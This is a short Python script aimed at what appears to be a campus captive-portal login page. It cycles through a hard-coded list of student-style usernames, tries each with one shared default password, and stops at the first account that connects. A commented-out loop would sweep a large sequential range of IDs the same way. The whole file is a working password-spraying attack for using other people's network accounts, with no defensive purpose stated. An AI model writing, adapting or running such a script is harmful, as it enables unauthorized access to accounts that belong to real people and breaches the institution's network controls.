import urllib.request
import re
import time 

host_url = 'http://172.16.0.30:8090/httpclient.html'
username = ['4155','4338','5428','5510','6160','6199','6257','6499','6501','6684','6869','6870','6877','6913','70493','70860','70981','71074','71087','71105','71144','71161','71163','71165','71183','71190','71193','71233','71252','71356','71435','71642']

def user_validity(num):
    try:
            req = urllib.request.Request(host_url)
            data = 'mode=191&username=f201'+username[num]+'&password=bits@123&a=1355344698415' 
            data = data.encode('utf-8')
            get = urllib.request.urlopen(host_url,data)
            getData = get.read()
            getData = getData.decode('ascii')
            message = re.findall(r'<message>(.*?)</message>',str(getData))
            return message[0]
        
    except urllib.error.URLError as err:
            print(str(err))


num = 0
while(1):
    message = user_validity(num)
    if(message == '<![CDATA[You have successfully logged in]]>'):
        print('f201'+username[num]+'= CONNECTED')
        break
    else:
        print('f201'+username[num]+'= FAILED CONNECTION'+' Reason ='+message)
        num=num+1

'''while(num<=20171800):
    message = user_validity(num)
    if(message == '<![CDATA[You have successfully logged in]]>'):
        print('f'+str(num))
    num=num+1'''




    

    
